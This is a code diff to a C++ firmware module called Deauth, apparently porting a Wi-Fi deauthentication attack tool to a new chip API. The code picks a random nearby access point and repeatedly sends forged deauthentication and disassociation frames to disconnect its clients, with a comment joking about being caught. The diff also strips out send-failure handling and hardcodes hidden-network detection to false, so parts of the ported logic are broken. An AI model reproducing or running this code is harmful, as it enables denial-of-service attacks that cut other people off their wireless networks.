@@ -14,7 +14,7 @@
 
 // default values before we start
 bool Deauth::running = false;
-std::vector<String> Deauth::whitelist = {};
+std::vector<std::string> Deauth::whitelist = {};
 String Deauth::randomAP = "";
 int Deauth::randomIndex;
 
@@ -96,12 +96,9 @@ void Deauth::list() {
  * @param len Length of packet
  * @param sys_seq Ignore this, just make it false
  */
-bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
-  // apparently will not work with 0 on regular, fixed on spacehuhn
-  bool sent = wifi_send_pkt_freedom(buf, len, sys_seq) == 0;
+void Deauth::send(uint8_t *buf, uint16_t len) {
+  wifi_tx_raw_frame(buf, len);
   delay(102);
-
-  return sent;
 }
 
 /**
@@ -139,7 +136,7 @@ void Deauth::printMac(uint8_t *mac) {
  */
 String Deauth::printHidden(int network) {
   String hidden;
-  bool check = WiFi.isHidden(network);
+  bool check = false;
 
   if (check == 0) {
     hidden = "False";
@@ -213,7 +210,7 @@ bool Deauth::select() {
     Display::updateDisplay("('-')", "Selected random AP: " + randomAP);
     delay(Config::shortDelay);
 
-    if (encType == -1 || encType == ENC_TYPE_NONE) {
+    if (encType == -1 || encType == WIFI_AUTH_OPEN) {
       Serial.println(
           "('-') Selected AP is not encrypted. Skipping deauthentication...");
       Display::updateDisplay(
@@ -415,32 +412,19 @@ void Deauth::start() {
 
   // send the deauth 150 times(ur cooked if they find out)
   for (int i = 0; i < packetCount; ++i) {
-    if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
-        Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
-      packets++;
-      float pps = packets / (float)(millis() - startTime) * 1000;
+    Deauth::send(deauthFrame, deauthFrameSize);
+    Deauth::send(disassociateFrame, disassociateFrameSize);
+    packets++;
+    float pps = packets / (float)(millis() - startTime) * 1000;
 
-      // show pps
-      if (!isinf(pps)) {
-        Serial.print("(>-<) Packets per second: ");
-        Serial.print(pps);
-        Serial.print(" pkt/s");
-        Serial.println(" (AP:" + randomAP + ")");
-        Display::updateDisplay("(>-<)", "Packets per second: " + (String)pps +
-                                            " pkt/s" + "(AP:" + randomAP + ")");
-      }
-    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
-               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
-      Serial.println("(X-X) Both packets failed to send!");
-      Display::updateDisplay("(X-X)", "Both packets failed to send!");
-    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
-               Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
-      Serial.println("(X-X) Deauthentication failed to send!");
-      Display::updateDisplay("(X-X)", "Deauth failed to send!");
-    } else if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
-               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
-      Serial.println("(X-X) Disassociation failed to send!");
-      Display::updateDisplay("(X-X)", "Disassoc failed to send!");
+    // show pps
+    if (!isinf(pps)) {
+      Serial.print("(>-<) Packets per second: ");
+      Serial.print(pps);
+      Serial.print(" pkt/s");
+      Serial.println(" (AP:" + randomAP + ")");
+      Display::updateDisplay("(>-<)", "Packets per second: " + (String)pps +
+                                          " pkt/s" + "(AP:" + randomAP + ")");
     } else {
       Serial.println("(X-X) Unable to calculate pkt/s!");
       Display::updateDisplay("(X-X)", "Unable to calculate pkt/s!");
